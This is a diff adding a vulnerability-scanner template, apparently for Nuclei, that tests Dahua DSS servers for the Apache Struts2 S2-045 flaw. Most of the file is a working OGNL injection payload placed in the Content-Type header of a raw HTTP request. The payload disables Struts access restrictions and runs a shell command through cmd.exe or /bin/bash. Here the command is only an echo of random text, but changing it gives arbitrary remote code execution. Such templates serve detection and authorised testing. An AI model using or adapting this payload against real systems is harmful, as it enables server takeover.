@@ -1,0 +1,27 @@
+id: dahua-dss-s2-045-rce
+
+info:
+  name: dahua-dss-s2-045-rce
+  author: xxx
+  severity: critical
+  description: dahua-dss-s2-045-rce
+  tags: dahua-dss,dahua
+variables:
+  randtxt: "{{to_lower(rand_text_alpha(8))}}"
+
+http:
+  - raw:
+      - |              
+        GET /admin/login_login.action HTTP/1.1
+        Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo {{randtxt}}').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+        Cookie: JSESSIONID=281F258E40BD1B32C20AA1E2FBC32A15; JSESSIONID=8ED7F0032B2552FBBA811F1EE83BA279
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Encoding: gzip,deflate,br
+        Host: {{Hostname}}
+        Connection: Keep-alive
+
+    matchers:     
+      - type: dsl
+        name: s2-045-rce
+        dsl:
+          - "status_code_1 == 200 && contains(body,'{{randtxt}}')" 
